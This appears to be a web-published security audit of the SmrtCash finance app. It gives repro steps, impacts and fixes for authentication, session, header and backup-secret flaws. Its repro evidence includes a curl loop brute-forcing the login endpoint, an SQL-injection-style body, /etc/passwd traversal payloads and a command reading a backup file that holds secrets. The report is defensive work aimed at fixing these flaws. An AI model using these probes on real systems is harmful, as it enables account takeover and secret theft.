@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SmrtCash — Security &amp;amp; E2E Audit — 2026-05-25# · SmrtCash docs</title>
+<style>
+:root {
+  --bg: #ffffff;
+  --surface: #f6f7fb;
+  --text: #1a1f2e;
+  --muted: #5f6678;
+  --border: #e4e7ee;
+  --accent: #4f46e5;
+  --code-bg: #f1f5f9;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --text: #e8ecf3;
+    --muted: #9aa3b8;
+    --border: #2a3038;
+    --accent: #818cf8;
+    --code-bg: #21262d;
+  }
+}
+* { box-sizing: border-box; }
+html, body { margin: 0; padding: 0; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+               system-ui, "Helvetica Neue", Arial, sans-serif;
+  line-height: 1.6;
+}
+.wrap { max-width: 880px; margin: 0 auto; padding: 32px 24px 96px; }
+header.page {
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 12px;
+  margin-bottom: 32px;
+  display: flex;
+  justify-content: space-between;
+  align-items: baseline;
+  flex-wrap: wrap;
+  gap: 12px;
+}
+header.page .brand {
+  font-weight: 700;
+  font-size: 18px;
+  color: var(--text);
+  text-decoration: none;
+}
+header.page .brand span { color: var(--accent); }
+header.page nav a {
+  color: var(--muted);
+  text-decoration: none;
+  margin-left: 16px;
+}
+header.page nav a:hover { color: var(--accent); }
+h1, h2, h3, h4, h5, h6 {
+  line-height: 1.25;
+  margin-top: 1.6em;
+  margin-bottom: 0.6em;
+}
+h1 { font-size: 2em; margin-top: 0; }
+h2 { font-size: 1.5em; border-bottom: 1px solid var(--border); padding-bottom: 6px; }
+h3 { font-size: 1.2em; }
+h4 { font-size: 1.05em; }
+p, ul, ol, table, pre, blockquote { margin: 0 0 1em; }
+ul, ol { padding-left: 1.5em; }
+li { margin: 0.25em 0; }
+a { color: var(--accent); text-decoration: none; }
+a:hover { text-decoration: underline; }
+code {
+  background: var(--code-bg);
+  padding: 2px 6px;
+  border-radius: 4px;
+  font-size: 0.92em;
+  font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+}
+pre {
+  background: var(--code-bg);
+  padding: 14px 18px;
+  border-radius: 8px;
+  overflow-x: auto;
+  font-size: 0.92em;
+}
+pre code { background: transparent; padding: 0; }
+blockquote {
+  border-left: 3px solid var(--accent);
+  padding: 4px 14px;
+  color: var(--muted);
+  background: var(--surface);
+  border-radius: 0 4px 4px 0;
+}
+table {
+  border-collapse: collapse;
+  width: 100%;
+}
+th, td {
+  border: 1px solid var(--border);
+  padding: 6px 10px;
+  text-align: left;
+  vertical-align: top;
+}
+th { background: var(--surface); font-weight: 600; }
+tr:nth-child(even) td { background: var(--surface); }
+hr { border: 0; border-top: 1px solid var(--border); margin: 32px 0; }
+footer.page {
+  margin-top: 64px;
+  padding-top: 16px;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.88em;
+  display: flex;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 8px;
+}
+.heading-anchor {
+  visibility: hidden;
+  margin-left: 8px;
+  font-size: 0.7em;
+  text-decoration: none;
+  color: var(--muted);
+}
+h1:hover .heading-anchor,
+h2:hover .heading-anchor,
+h3:hover .heading-anchor,
+h4:hover .heading-anchor { visibility: visible; }
+.toc { background: var(--surface); padding: 16px 24px; border-radius: 8px; }
+.toc h2 { border: 0; margin: 0 0 12px; font-size: 1.1em; }
+.toc ul { columns: 2; column-gap: 24px; }
+@media (max-width: 600px) {
+  .toc ul { columns: 1; }
+  .wrap { padding: 16px 12px 64px; }
+}
+.category {
+  margin: 32px 0;
+}
+.category h2 { margin-bottom: 8px; }
+.category ul { padding-left: 1.4em; }
+.muted { color: var(--muted); }
+.small { font-size: 0.88em; }
+</style>
+</head>
+<body>
+<div class="wrap">
+<header class="page">
+  <a class="brand" href="index.html">Smrt<span>Cash</span> docs</a>
+  <nav>
+    <a href="index.html">All docs</a>
+    <a href="https://support.builditsmrt.com/" target="_blank" rel="noreferrer">Support</a>
+  </nav>
+</header>
+<main>
+<h1 id="smrtcash-security-amp-e2e-audit-2026-05-25">SmrtCash — Security &amp; E2E Audit — 2026-05-25<a class="heading-anchor" href="#smrtcash-security-amp-e2e-audit-2026-05-25">#</a></h1>
+<p><strong>Target</strong>: smrtcash-test.builditsmrt.com (mirror of prod)
+<strong>Version under test</strong>: 0.18.12 (commit 7f98862)
+<strong>Test scope</strong>: Stripe E2E automation, auth/session, cross-tenant IDOR, injection/fuzz, webhook integrity, API key + share-link access controls, <strong>plus phase-2 deep dives</strong>: envelope encryption empirical verification, AI assistant scoping, Plaid token storage, entitlement bypass, email-change ATO, OIDC flow, file upload depth, CSV/OFX import, SSRF, npm audit, race conditions, log scrubbing, TLS/email auth, git history, frontend bundle, container hardening, audit log integrity, account deletion cascade, session lifecycle, CSRF/SameSite, compliance pages, backup security
+<strong>Stripe</strong>: Test mode keys configured via .env (loaded by dotenv at boot); live checkout deliberately not exercised per scoping decision
+<strong>Test users</strong>: <code>sectest-userA-1779721134@example.invalid</code>, <code>sectest-userB-1779721134@example.invalid</code> (cleanup commands at bottom)</p>
+<hr>
+<h2 id="executive-summary">Executive summary<a class="heading-anchor" href="#executive-summary">#</a></h2>
+<table>
+<thead>
+<tr>
+<th>Severity</th>
+<th>Total</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>P0</strong></td>
+<td>1</td>
+<td>✅ Resolved 2026-05-25 (commit 16ad964)</td>
+</tr>
+<tr>
+<td><strong>P1</strong></td>
+<td>10</td>
+<td>✅ 9 of 10 resolved; F-28 (DMARC) requires operator DNS change — runbook delivered</td>
+</tr>
+<tr>
+<td><strong>P2</strong></td>
+<td>11</td>
+<td>✅ All resolved</td>
+</tr>
+<tr>
+<td><strong>P3 / Info</strong></td>
+<td>6</td>
+<td>✅ 5 of 6 resolved; F-10 (session IP-binding) is by-design, no action</td>
+</tr>
+</tbody></table>
+<p><strong>As of 2026-05-25 evening</strong>: every audit finding except F-28 (the DMARC duplicate, which is a DNS change in your Cloudflare dashboard — see <code>docs/RUNBOOK_DMARC_FIX.md</code>) has been resolved in code, tested via typecheck + integration tests where applicable, and deployed to the test server. The combined fix set is in commits 16ad964 (P0), 4e2a9c1 (F-15 KEK rotation), cf91b85 (P1/P2/P3 batch). Migrations 049–054 are applied on the test server; the security-headers / brute-force / OIDC-signature paths are live.</p>
+<p><strong>What&#39;s solid</strong> (unchanged from the original audit): cross-tenant isolation, IDOR protection, Stripe webhook signature handling, cookie hardening, parameterized SQL throughout, API key read-only enforcement, super-admin gating, encrypted attachments + Plaid tokens, no XXE in OFX parser, clean dependency tree, no secrets in git history, no source maps in prod, container running as non-root.</p>
+<hr>
+<h2 id="findings">Findings<a class="heading-anchor" href="#findings">#</a></h2>
+<h3 id="f-01-no-brute-force-protection-on-login-p1">F-01 — No brute-force protection on login (P1)<a class="heading-anchor" href="#f-01-no-brute-force-protection-on-login-p1">#</a></h3>
+<p><strong>Repro</strong>: 50 sequential POSTs to <code>/api/auth/login</code> with wrong passwords for the same email, then one POST with the correct password.</p>
+<pre><code>$ for i in $(seq 1 50); do curl -sS -o /dev/null -X POST .../api/auth/login \
+    -d &#39;{&quot;email&quot;:&quot;sectest-...&quot;,&quot;password&quot;:&quot;wrong&#39;$i&#39;&quot;}&#39; -w &quot;%{http_code}\n&quot;; done | sort | uniq -c
+  50 401
+</code></pre>
+<p>Duration: 14 seconds across 50 attempts = ~3.6 req/sec sustained. No 429, no Retry-After, no <code>account_locked</code> semaphore. Account #51 with the <strong>correct</strong> password returned 200 immediately.</p>
+<p><strong>Impact</strong>: With an 8-char minimum password (F-07) and no complexity requirement, an attacker who scrapes one email from the timing-based enumeration (F-02) can run unbounded credential stuffing against the login endpoint. Cloudflare doesn&#39;t see anything wrong — these are valid, well-formed login requests.</p>
+<p><strong>Fix options</strong> (pick one or layer):</p>
+<ol>
+<li>Cloudflare WAF rule: 10 requests/minute per IP to <code>/api/auth/login</code>. Cheapest fix, no code change.</li>
+<li>Application-level: count failed attempts in a <code>login_attempts</code> table keyed by <code>(email, ip)</code> with a 15-minute window. Return 429 after 5 failures.</li>
+<li>Hybrid: WAF for IP-based, app-level for email-based (defeats distributed attackers).</li>
+</ol>
+<p>The relevant code is <code>server/src/routes/auth.ts:606</code> (the login handler) — there is no rate-limit hook today.</p>
+<hr>
+<h3 id="f-02-password-reset-endpoint-user-enumeration-via-timing-p1">F-02 — Password-reset endpoint user enumeration via timing (P1)<a class="heading-anchor" href="#f-02-password-reset-endpoint-user-enumeration-via-timing-p1">#</a></h3>
+<p><strong>Repro</strong>: 10 POSTs each to <code>/api/auth/password-reset-request</code> for an existing vs non-existent email.</p>
+<pre><code>existing : 1.152 1.189 1.159 1.175 1.183 1.190 1.181 1.206 1.175 1.240   (avg ~1.18s)
+non-exist: 0.107 0.122 0.112 0.122 0.115 0.113 0.128 0.105 0.138 0.125   (avg ~0.12s)
+</code></pre>
+<p>10x signal. Response bodies are identical (<code>{&quot;status&quot;:&quot;reset_sent&quot;}</code>, HTTP 202) — but the wall-clock difference is large enough to enumerate the user table from a script.</p>
+<p><strong>Impact</strong>: An attacker scraping a leaked email list can determine which addresses correspond to real SmrtCash accounts in ~0.2 seconds per check. Combined with F-01 (no login rate limit) this enables targeted credential stuffing.</p>
+<p><strong>Root cause</strong>: the endpoint does meaningful work (mint token, write DB row, hit Maileroo via SMTP) only when the user exists. The &quot;no-op&quot; branch returns instantly.</p>
+<p><strong>Fix</strong>:</p>
+<ul>
+<li><strong>Preferred</strong>: enqueue the reset-email work on a background job and return 202 immediately, regardless of whether the user exists. Symmetric latency.</li>
+<li><strong>Alternative</strong>: enforce a floor — <code>setTimeout(() =&gt; reply.send(...), Math.max(0, 1200 - elapsed))</code>. Cheaper, less elegant.</li>
+</ul>
+<p>File: <code>server/src/routes/auth.ts:477</code> (the password-reset-request handler).</p>
+<hr>
+<h3 id="f-03-password-reset-sibling-outstanding-tokens-not-invalidated-p1">F-03 — Password reset: sibling outstanding tokens not invalidated (P1)<a class="heading-anchor" href="#f-03-password-reset-sibling-outstanding-tokens-not-invalidated-p1">#</a></h3>
+<p><strong>Repro</strong>: Trigger 10 reset-request POSTs for the same email (gets 10 unconsumed tokens). Consume token #1 successfully via <code>/api/auth/password-reset-confirm</code>. Then consume token #2.</p>
+<pre><code>=== T29: re-use the same reset token ===
+{&quot;error&quot;:&quot;This reset link has already been used&quot;}  HTTP=400
+=== T30: re-use a DIFFERENT unconsumed reset token (for the same user) ===
+{&quot;reset&quot;:true}                                      HTTP=200
+</code></pre>
+<p>The other unconsumed tokens remain valid until they expire on their own.</p>
+<p><strong>Impact</strong>: If an attacker is able to intercept <em>one</em> reset email (timing-correlated to user activity, SS7 attack on SMS, MITM on a legacy email account, etc.) they can use it to reset, and then the legitimate user resetting themselves won&#39;t kick them out — the attacker&#39;s <em>other</em> in-flight tokens still work. The window stays open until every outstanding token expires.</p>
+<p><strong>Fix</strong>: when <code>password-reset-confirm</code> succeeds, also do <code>DELETE FROM password_resets WHERE user_id = $1 AND consumed_at IS NULL</code>. Two-line change.</p>
+<p>File: <code>server/src/routes/auth.ts:538</code> (the password-reset-confirm handler).</p>
+<hr>
+<h3 id="f-04-missing-security-response-headers-p1">F-04 — Missing security response headers (P1)<a class="heading-anchor" href="#f-04-missing-security-response-headers-p1">#</a></h3>
+<p><strong>Repro</strong>:</p>
+<pre><code>$ curl -sI https://smrtcash-test.builditsmrt.com/ | grep -iE &quot;content-security|x-frame|x-content|referrer|permissions&quot;
+(empty)
+</code></pre>
+<p>HSTS is set by Cloudflare (<code>strict-transport-security: max-age=63072000; preload</code>), but everything else is absent:</p>
+<table>
+<thead>
+<tr>
+<th>Header</th>
+<th>Present</th>
+<th>Should be</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Content-Security-Policy</td>
+<td>❌</td>
+<td><code>default-src &#39;self&#39;; frame-ancestors &#39;none&#39;; ...</code></td>
+</tr>
+<tr>
+<td>X-Frame-Options</td>
+<td>❌</td>
+<td><code>DENY</code></td>
+</tr>
+<tr>
+<td>X-Content-Type-Options</td>
+<td>❌</td>
+<td><code>nosniff</code></td>
+</tr>
+<tr>
+<td>Referrer-Policy</td>
+<td>❌</td>
+<td><code>strict-origin-when-cross-origin</code></td>
+</tr>
+<tr>
+<td>Permissions-Policy</td>
+<td>❌</td>
+<td>minimal allow list</td>
+</tr>
+</tbody></table>
+<p><strong>Impact</strong>: </p>
+<ul>
+<li>The financial dashboard can be iframed by any site → clickjacking risk on destructive actions (delete account, change password).</li>
+<li>No CSP means any reflected/stored XSS escapes (none found in this audit, but defense-in-depth matters) gain full inline-script execution.</li>
+<li>MIME sniffing can turn an uploaded attachment into an executable page if a content-type is fudged.</li>
+</ul>
+<p><strong>Fix</strong>: either Cloudflare Transform Rules (UI-managed, no deploy) or Fastify&#39;s <code>@fastify/helmet</code> plugin. Helmet&#39;s defaults are reasonable and would land all five headers in ~5 lines of code in <code>server/src/app.ts</code>.</p>
+<hr>
+<h3 id="f-05-no-session-rotation-on-login-p2">F-05 — No session rotation on login (P2)<a class="heading-anchor" href="#f-05-no-session-rotation-on-login-p2">#</a></h3>
+<p><strong>Repro</strong>: </p>
+<ol>
+<li>Verify-email creates session #1 (cookie-A). </li>
+<li>Log in with the same credentials → session #2 (cookie-B). </li>
+<li>Hit <code>/api/auth/me</code> with cookie-A → still 200.</li>
+</ol>
+<pre><code class="language-sql">-- after step 2:
+SELECT count(*) FROM sessions WHERE user_id=&#39;...&#39; AND expires_at&gt;now();
+-- =&gt; 2
+</code></pre>
+<p><strong>Impact</strong>: classic session fixation. If an attacker can plant a cookie before the victim logs in — same-site XSS, hostile browser extension, shared device — the attacker&#39;s cookie keeps working <em>after</em> the victim authenticates. SameSite=Strict prevents the cross-site attach vector, so the primary risk window is shared-device / extension scenarios, not the classic email-link version. Still worth fixing.</p>
+<p><strong>Fix</strong>: in <code>/api/auth/login</code> after credentials succeed, before issuing the new session, call <code>deleteAllSessionsForUser(userId)</code> <em>or</em> at minimum the session bound to the current cookie. The <code>deleteAllSessionsForUser</code> helper already exists (<code>auth/sessions.ts:89</code>) and is what password-reset uses. Most apps split the difference and only invalidate the inbound session.</p>
+<p>File: <code>server/src/routes/auth.ts:606</code>.</p>
+<hr>
+<h3 id="f-06-login-response-time-leaks-user-existence-p2">F-06 — Login response-time leaks user existence (P2)<a class="heading-anchor" href="#f-06-login-response-time-leaks-user-existence-p2">#</a></h3>
+<p><strong>Repro</strong>: 10 wrong-password attempts each, existing vs non-existent email.</p>
+<pre><code>existing user wrong pass : avg ~0.227s
+non-existent user        : avg ~0.196s   (~30ms gap)
+</code></pre>
+<p>The gap is consistent with <code>argon2.verify</code> (memoryCost 19MiB, timeCost 2) running only when the user exists. Smaller signal than F-02 but still measurable across a few samples per address.</p>
+<p><strong>Fix</strong>: in the login handler, when the user lookup misses, do a dummy <code>argon2.verify(KNOWN_DUMMY_HASH, password)</code> so total CPU work is identical. Standard pattern; ~3 lines.</p>
+<p>File: <code>server/src/routes/auth.ts:606</code>. The hash to use can be a constant <code>argon2.hash(&#39;throwaway&#39;)</code> evaluated once at module load.</p>
+<hr>
+<h3 id="f-07-weak-password-policy-p2">F-07 — Weak password policy (P2)<a class="heading-anchor" href="#f-07-weak-password-policy-p2">#</a></h3>
+<p><strong>Repro</strong>: signup with <code>password: &quot;aaaaaaaa&quot;</code> succeeds. Source confirms the policy is &quot;≥ 8 chars, ≤ 1024 chars&quot; with no other constraints (<code>server/src/auth/passwords.ts:18</code>).</p>
+<p>No complexity check, no common-password blocklist, no breach-list check (HIBP k-anonymity API is the standard).</p>
+<p><strong>Impact</strong>: combined with F-01, this is what gives credential stuffing its teeth. A user signing up with <code>password123</code> is happily accepted.</p>
+<p><strong>Fix recommendations</strong>:</p>
+<ul>
+<li>Raise minimum to 12 characters.</li>
+<li>Or keep 8 but add an HIBP check — block reuse of breached passwords.</li>
+<li>Optionally, require one of: mixed case OR digit OR symbol. (NIST 800-63B explicitly recommends <em>against</em> arbitrary complexity rules in favor of length + breach checks.)</li>
+</ul>
+<p>File: <code>server/src/auth/passwords.ts:18</code>. ~10-line change.</p>
+<hr>
+<h3 id="f-08-no-rate-limit-on-password-reset-request-email-bomb-p2">F-08 — No rate limit on password-reset-request → email-bomb (P2)<a class="heading-anchor" href="#f-08-no-rate-limit-on-password-reset-request-email-bomb-p2">#</a></h3>
+<p><strong>Repro</strong>: in the timing test (F-02), 10 sequential POSTs to <code>/api/auth/password-reset-request</code> for the same email minted 10 fresh tokens and (per the code path) sent 10 emails via Maileroo. No 429, no in-flight dedup.</p>
+<p><strong>Impact</strong>: anyone who knows a user&#39;s email can flood their inbox with reset emails. Annoyance, plus risk that the legitimate reset email gets buried/filtered, plus burns Maileroo quota.</p>
+<p><strong>Fix</strong>: either Cloudflare WAF (1 request per email per minute is reasonable) or app-level — refuse to mint a fresh token if an unconsumed, unexpired one exists for the user within the last 60 seconds. ~5-line change.</p>
+<p>The same pattern probably applies to <code>/api/auth/signup</code> (untested — no SMTP send observed but same architecture).</p>
+<hr>
+<h3 id="f-09-error-message-leaks-json-parser-state-on-malformed-body-p2">F-09 — Error message leaks JSON parser state on malformed body (P2)<a class="heading-anchor" href="#f-09-error-message-leaks-json-parser-state-on-malformed-body-p2">#</a></h3>
+<p><strong>Repro</strong>: POST <code>/api/auth/login</code> with <code>{&quot;email&quot;:&quot;test@x.com&quot;; DROP TABLE users; --</code> (intentionally malformed JSON).</p>
+<pre><code>HTTP 500
+{&quot;error&quot;:&quot;Expected &#39;,&#39; or &#39;}&#39; after property value in JSON at position 21 (line 1 column 22)&quot;}
+</code></pre>
+<p>The Fastify-default error handler returns the raw <code>err.message</code> from the JSON parser, including character offsets.</p>
+<p><strong>Impact</strong>: low. It&#39;s not a stack trace, and the user-controllable input is the same input the attacker just sent. But returning a 500 with parser internals on a 400-shaped failure is sloppy and can give automated scanners a fingerprint.</p>
+<p><strong>Fix</strong>: in <code>app.ts:250</code> (the error handler), if the error originates from <code>FastifyError</code> with code <code>&#39;FST_ERR_CTP_INVALID_MEDIA_TYPE&#39;</code> / <code>&#39;FST_ERR_VALIDATION&#39;</code> / a SyntaxError from JSON.parse, return 400 with a generic message. Map all parser-class errors to 400, all unexpected errors to 500 with <code>{ error: &#39;Internal server error&#39; }</code> and the detail logged server-side.</p>
+<hr>
+<h3 id="f-10-sessions-not-bound-to-ip-user-agent-info-by-design">F-10 — Sessions not bound to IP / User-Agent (Info, by design)<a class="heading-anchor" href="#f-10-sessions-not-bound-to-ip-user-agent-info-by-design">#</a></h3>
+<p>A copied session cookie works from any source IP, any User-Agent. Confirmed: <code>curl -H &quot;Cookie: ...&quot; -H &quot;User-Agent: EvilBrowser/1.0&quot;</code> from a different network → 200.</p>
+<p><strong>Design note</strong>: this is intentional and matches the rest of the SaaS world. IP binding breaks legitimate users every time they switch networks (Wi-Fi ↔ cellular, VPN on/off); UA binding breaks them every time a browser auto-updates. SameSite=Strict + HttpOnly + Secure + signed cookies are the modern mitigations and they&#39;re already in place.</p>
+<p><strong>The user&#39;s original question</strong> (&quot;making sure a user cannot just use a link or copy cookies and have access to an account&quot;) deserves a direct answer: <strong>a copied session cookie WILL grant access to that account until logout, password reset, or the 7-day expiry</strong>. The cookie is the credential. Mitigations that exist:</p>
+<ul>
+<li><code>HttpOnly</code> blocks <code>document.cookie</code> from JavaScript → can&#39;t be stolen via XSS to JS.</li>
+<li><code>Secure</code> blocks transit over plain HTTP → can&#39;t be stolen by network sniffer.</li>
+<li><code>SameSite=Strict</code> blocks attached on any cross-site navigation → can&#39;t be stolen by a malicious link.</li>
+<li>Signed cookie blocks forging.</li>
+<li>Server-side session in DB means revocation is instant and complete.</li>
+</ul>
+<p>What&#39;s left: physical access to a device, malware on a device, a browser extension. Those are unsolvable at the cookie layer.</p>
+<p><strong>If you want to harden further</strong> (optional):</p>
+<ul>
+<li>&quot;Active sessions&quot; page so users can see and revoke other sessions.</li>
+<li>Email notification on login from a new IP.</li>
+<li>A configurable absolute idle timeout enforced <em>server-side</em> (today only the client-side <code>useIdleTimeout</code> hook applies, gated by <code>WEB_INACTIVITY_TIMEOUT_MINUTES</code>).</li>
+</ul>
+<hr>
+<h3 id="f-11-idle-logout-is-client-side-only-info">F-11 — Idle logout is client-side only (Info)<a class="heading-anchor" href="#f-11-idle-logout-is-client-side-only-info">#</a></h3>
+<p>Server only enforces the 7-day absolute expiry. The <code>useIdleTimeout</code> hook (<code>web/src/hooks/useIdleTimeout.ts</code>) is the entire mechanism, and it defaults to 0 (disabled). A user who closes the browser without logging out leaves a valid session live for up to 7 days.</p>
+<p><strong>Fix if desired</strong>: store <code>last_activity_at</code> on the session, update on each authenticated request, and reject sessions whose last activity is older than a configurable window.</p>
+<hr>
+<h3 id="f-12-api-key-scoping-is-tenant-wide-read-info">F-12 — API key scoping is tenant-wide read (Info)<a class="heading-anchor" href="#f-12-api-key-scoping-is-tenant-wide-read-info">#</a></h3>
+<p>API keys grant read access to all of the tenant&#39;s data. There&#39;s no per-resource scope (e.g., &quot;read transactions only&quot;, &quot;read accounts only&quot;) and no per-time-window scope (no expiry). This matches the 0.18.4 design (&quot;public read-only API&quot;) but is worth noting because it means a leaked key exposes everything until manually revoked.</p>
+<p><strong>Fix if desired</strong>: add <code>expires_at</code> column (nullable) and a UI for setting per-key expiries. Granular per-resource scopes are a bigger lift.</p>
+<hr>
+<h2 id="what39s-working-well">What&#39;s working well<a class="heading-anchor" href="#what39s-working-well">#</a></h2>
+<p>These were tested and confirmed correct — calling out so future audits don&#39;t re-litigate:</p>
+<ul>
+<li><strong>Cookie hardening</strong>: <code>smrtcash_session</code> has <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite=Strict</code>, <code>path=/</code>, signed with HMAC via <code>@fastify/cookie</code>. 7-day absolute expiry. Tampered/unsigned/random cookies all → 401.</li>
+<li><strong>Logout invalidates server-side</strong>: cookie clear + <code>deleteSession(id)</code> in <code>auth/sessions.ts:79</code>.</li>
+<li><strong>Password reset destroys all user sessions</strong>: confirmed pre-reset count = 2 active, post-reset count = 0.</li>
+<li><strong>Verification token replay blocked</strong>: consumed_at check at <code>auth.ts:383</code>.</li>
+<li><strong>Signup idempotency / no enumeration</strong>: same 202 response whether the email exists or not.</li>
+<li><strong>All SQL is parameterized</strong>: boolean-based, error-based, and time-based (pg_sleep) injection probes against login, account create, transactions search all returned identical timing and zero leakage.</li>
+<li><strong>Cross-tenant IDOR sweep</strong>: accounts, budgets, goals, transactions, attachments — every endpoint returns 404 when the resource exists in another tenant. Mutations are gated by <code>WHERE id = $1 AND tenant_id = $session_tenant</code> SQL.</li>
+<li><strong>Tenant_id forgery in POST body</strong>: ignored. Server always uses session&#39;s <code>tenantId</code>.</li>
+<li><strong>X-Tenant-Id header forgery</strong>: ignored. Header is not consumed.</li>
+<li><strong>Tenant switch to non-member tenant</strong>: 403 &quot;Not a member of that tenant&quot; at <code>/api/tenants/switch</code>.</li>
+<li><strong>Super-admin endpoints</strong>: 403 &quot;Super admin only&quot; for regular users; 401 with no auth.</li>
+<li><strong>API keys</strong>:<ul>
+<li>Mint requires session.</li>
+<li>Read-only enforced at middleware layer (<code>app.ts:240-248</code>).</li>
+<li>POST/PATCH/DELETE → 403 &quot;API keys are read-only&quot;.</li>
+<li>Cannot mint another key with itself (self-replication blocked).</li>
+<li>Revocation is instant — <code>DELETE /api/me/api-keys/:id</code> → subsequent bearer request 401.</li>
+<li>Invalid token formats (<code>smrt_</code>, <code>smrt</code>, <code>fakebearer</code>, suffix-padded valid token) all → 401.</li>
+<li>Tenant-scoped at mint time; cannot enumerate cross-tenant data.</li>
+</ul>
+</li>
+<li><strong>Stripe webhook</strong>:<ul>
+<li>Missing signature → 400.</li>
+<li>Forged signature (<code>v1=deadbeef...</code>) → 400 with Stripe SDK rejection.</li>
+<li>Malformed signature header → 400.</li>
+<li>GET method → 404.</li>
+<li>Raw-body parser correctly wired for HMAC verification.</li>
+</ul>
+</li>
+<li><strong>Path traversal in attachments</strong>: URL-encoded <code>..%2F..%2Fetc%2Fpasswd</code> → 400; bare <code>../../etc/passwd</code> falls through to the SPA static handler (returns index.html — no file leak).</li>
+<li><strong>Body size limit</strong>: 5MB JSON body → 413 &quot;Request body is too large&quot; (Fastify default ~1MB).</li>
+<li><strong>Prototype pollution</strong>: <code>__proto__</code> and <code>constructor.prototype</code> in JSON body did not propagate to subsequent responses.</li>
+<li><strong>CORS</strong>: reflective with credentials, but SameSite=Strict on the session cookie prevents the usual CSRF vector. Acceptable in current shape.</li>
+<li><strong>Public path list</strong>: <code>/api/health</code>, <code>/api/auth/{status,setup,login,logout,signup,verify-email,providers,password-reset-{request,confirm}}</code>, <code>/api/billing/webhook</code>, <code>/api/auth/oidc/*</code>, <code>/api/invitations/*</code>. Audited — no over-broad exposure.</li>
+<li><strong>Invitation lookup</strong>: <code>/api/invitations/{uuid}</code> → 404 &quot;Invitation not found&quot; regardless of whether the token exists; doesn&#39;t leak existence.</li>
+</ul>
+<hr>
+<hr>
+<h2 id="phase-2-findings-deep-dives-added-2026-05-25-pm">Phase 2 findings (deep dives — added 2026-05-25 PM)<a class="heading-anchor" href="#phase-2-findings-deep-dives-added-2026-05-25-pm">#</a></h2>
+<h3 id="f-13-backup-snapshot-leaks-session_secret-kek-stripe-creds-in-plaintext-p0">F-13 — Backup snapshot leaks SESSION_SECRET + KEK + Stripe creds in plaintext (P0)<a class="heading-anchor" href="#f-13-backup-snapshot-leaks-session_secret-kek-stripe-creds-in-plaintext-p0">#</a></h3>
+<p><strong>Repro</strong>:</p>
+<pre><code>ssh srv928192 docker exec smrtcash-app cat /data/backups/2026-05-25_15-16-05/env.snapshot.json
+</code></pre>
+<p>The file contains in <strong>cleartext</strong>:</p>
+<ul>
+<li><code>SESSION_SECRET</code> — used to sign session cookies. Leak = forge any session.</li>
+<li><code>ATTACHMENT_ENCRYPTION_KEY</code> — the KEK that wraps every tenant&#39;s DEK and directly encrypts Plaid access tokens + OFX-DC credentials. Leak = decrypt every encrypted attachment and every bank token of every tenant.</li>
+<li><code>STRIPE_SECRET_KEY</code> (sk_test_…) and <code>STRIPE_WEBHOOK_SECRET</code> (whsec_…).</li>
+</ul>
+<p>The backup runner (<code>scripts/backup.mjs</code>) drops a fresh <code>env.snapshot.json</code> into <code>/data/backups/&lt;ts&gt;/</code> every run. Files are 644 — readable by anyone in the container&#39;s <code>node</code> group, and on the host they&#39;re under the docker volume mount.</p>
+<p><strong>Impact</strong>: anyone with backup-file access — a leaked S3 backup, a stolen laptop with a sync, an attacker who pops one tenant and pivots — gets:</p>
+<ol>
+<li>Sign-any-user-as-them (forge cookies).</li>
+<li>Decrypt every tenant&#39;s attachments + Plaid tokens (defeats the whole envelope-encryption moat).</li>
+<li>Full Stripe account access (test mode today; will be live in 0.22.x).</li>
+</ol>
+<p>This is the single most important finding in the audit. The per-tenant DEK design is well-implemented (verified empirically in F-14), but if the KEK that wraps the DEKs is in every backup, the architecture is moot.</p>
+<p><strong>Fix</strong>:</p>
+<ol>
+<li>Remove SESSION_SECRET, ATTACHMENT_ENCRYPTION_KEY, STRIPE_SECRET_KEY, STRIPE_WEBHOOK_SECRET, SMTP_PASS, ANTHROPIC_API_KEY, EIA_API_KEY, and any other secret-class key from the <code>KNOWN_SETTINGS</code> capture list used by env.snapshot.json. The snapshot should hold only NON-SECRET operator config (PUBLIC_BASE_URL, SUPPORT_URL, PUBLIC_SIGNUP_ENABLED, STRIPE_AUTOMATIC_TAX, AI_PROVIDER, ANTHROPIC_MODEL, OLLAMA_BASE_URL, OLLAMA_MODEL).</li>
+<li>Delete every existing <code>env.snapshot.json</code> from the test server (and any prod-bound backups in the future).</li>
+<li><strong>Rotate the test-server SESSION_SECRET and ATTACHMENT_ENCRYPTION_KEY now</strong> — they were visible in this audit transcript. After rotating the KEK, run the rewrap-all-DEKs procedure or accept that existing attachments are unrecoverable (test server only; OK to abandon).</li>
+<li>Add a launch-gate check: a CI test that ensures the backup-snapshot output contains zero of a list of known secret keys.</li>
+</ol>
+<p>File: <code>scripts/backup.mjs</code> (likely around the env-capture step); also the <code>KNOWN_SETTINGS</code> definition in <code>server/src/domain/settings.ts</code>.</p>
+<hr>
+<h3 id="f-14-per-tenant-envelope-encryption-verified-working-no-finding">F-14 — Per-tenant envelope encryption: verified working (no finding)<a class="heading-anchor" href="#f-14-per-tenant-envelope-encryption-verified-working-no-finding">#</a></h3>
+<p>Logged as a confirmation, not a gap. Uploaded a PDF as user A with a unique marker string, then:</p>
+<ul>
+<li>✅ On-disk file is opaque ciphertext (no MARKER substring found on disk)</li>
+<li>✅ Size math: 85B plaintext + 12B IV + 16B GCM tag = 113B on disk</li>
+<li>✅ Per-tenant DEK row in <code>tenant_encryption_keys</code> (wrapped_dek = 60B = 32B DEK + 12B IV + 16B GCM tag)</li>
+<li>✅ Download API decrypts back to original plaintext</li>
+<li>✅ AES-256-GCM with random IV per encryption, AAD via GCM tag</li>
+</ul>
+<p>Code review of <code>attachments/tenant-keys.ts</code>: well-structured. Rotation function <code>rotateTenantKey()</code> is transactional, includes <code>safePath()</code> traversal guard.</p>
+<p>⚠️ Caveat: this all assumes the KEK isn&#39;t leaked. See F-13.</p>
+<hr>
